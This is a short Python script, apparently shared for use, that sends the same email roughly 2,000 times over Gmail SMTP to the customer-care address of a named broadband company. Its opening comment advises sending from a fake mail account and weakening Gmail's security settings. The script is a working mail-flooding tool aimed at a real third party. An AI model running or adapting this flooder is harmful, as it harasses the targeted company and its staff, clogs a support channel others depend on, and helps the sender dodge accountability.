# MAKE SURE IF YOU ARE USING YOUR GMAIL ACCOUNT YOU WILL HAVE TO ALLOW ACCESS TO THIRD PARTY PROGRAMS, IT WILL LESSEN YOUR SECURITY, SO YOU MIGHT WANNA RUN THIS ON YOUR FAKE MAIL ID
import smtplib

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
i=0
while i<=2000:
    fromaddr = "YOUR MAIL ID"
    toaddr = "customercare@youbroadband.co.in"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "YOUR SUBJECT OF MAIL"
    body = "YOUR MESSAGE"

    msg.attach(MIMEText(body, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "YOUR PASSWORD")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()
    i+=1
